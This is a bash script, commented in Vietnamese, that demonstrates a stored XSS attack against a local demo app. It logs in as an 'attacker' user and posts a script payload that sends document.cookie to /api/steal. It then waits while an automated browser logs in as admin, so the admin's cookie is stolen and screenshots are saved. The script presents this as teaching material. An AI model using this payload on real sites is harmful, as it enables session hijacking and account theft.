#!/bin/bash

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║         🌐 CHROME AUTO-LOGIN XSS DEMO                       ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

echo "📝 Step 1: Login as attacker (user1)"
echo "───────────────────────────────────────────────────────────────"
LOGIN=$(curl -s -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"password1"}')
echo $LOGIN | jq
echo ""

echo "📝 Step 2: Post XSS payload để trigger Chrome Auto-Login"
echo "───────────────────────────────────────────────────────────────"
PAYLOAD='<script>fetch("/api/steal?cookie="+document.cookie)</script>'
echo "Payload: $PAYLOAD"
echo ""

COMMENT=$(curl -s -X POST http://localhost:3000/api/comment \
  -H "Content-Type: application/json" \
  -H "Cookie: auth=user1:password1" \
  -d "{\"comment\":\"$PAYLOAD\"}")
echo $COMMENT | jq
echo ""

echo "🚀 Step 3: Chrome Auto-Login Triggered!"
echo "───────────────────────────────────────────────────────────────"
echo "✅ XSS payload detected!"
echo "⏰ Chrome sẽ mở sau 3 giây..."
echo "🔐 Admin sẽ tự động đăng nhập..."
echo "👀 Admin sẽ xem comments..."
echo "🎯 XSS payload sẽ execute thật trong browser!"
echo "📸 Screenshot sẽ được lưu..."
echo "🔒 Browser sẽ tự đóng sau 5 giây..."
echo ""

echo "📊 Step 4: Đang đợi Chrome automation..."
echo "───────────────────────────────────────────────────────────────"

for i in {3..1}; do
    echo -n "Chrome sẽ mở sau $i giây... "
    sleep 1
    echo "✅"
done

echo ""
echo "🌐 Chrome browser đã mở! Hãy xem magic! ✨"
echo ""
echo "📝 Step 5: Đang đợi automation hoàn thành..."
echo "───────────────────────────────────────────────────────────────"

# Đợi 10 giây để automation hoàn thành
for i in {10..1}; do
    echo -n "Automation đang chạy... $i giây còn lại... "
    sleep 1
    echo "⏳"
done

echo ""
echo "✅ Step 6: Check Results"
echo "───────────────────────────────────────────────────────────────"
echo "🔍 Kiểm tra server console để xem:"
echo "  - Chrome browser đã mở"
echo "  - Admin đã đăng nhập"  
echo "  - XSS payload đã execute"
echo "  - Cookie đã bị đánh cắp"
echo "  - Screenshot đã được lưu"
echo "  - Browser đã đóng"
echo ""

echo "📸 Screenshots được lưu với tên: xss-attack-{timestamp}.png"
echo ""

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║              🌐 CHROME AUTO-LOGIN COMPLETED! 🌐            ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "💡 Tips:"
echo "  - Xem server console để theo dõi toàn bộ quá trình"
echo "  - Chrome browser sẽ tự động mở và đóng"
echo "  - Screenshots được lưu trong thư mục project"
echo "  - XSS payload thực sự execute trong browser context"
echo "  - Cookie admin bị đánh cắp và gửi đến /api/steal"
echo ""
echo "🎓 Educational Value:"
echo "  - Thấy được quá trình XSS attack thật"
echo "  - Hiểu rõ session hijacking impact"
echo "  - Learn về browser automation security"
echo "  - Real-world attack simulation"
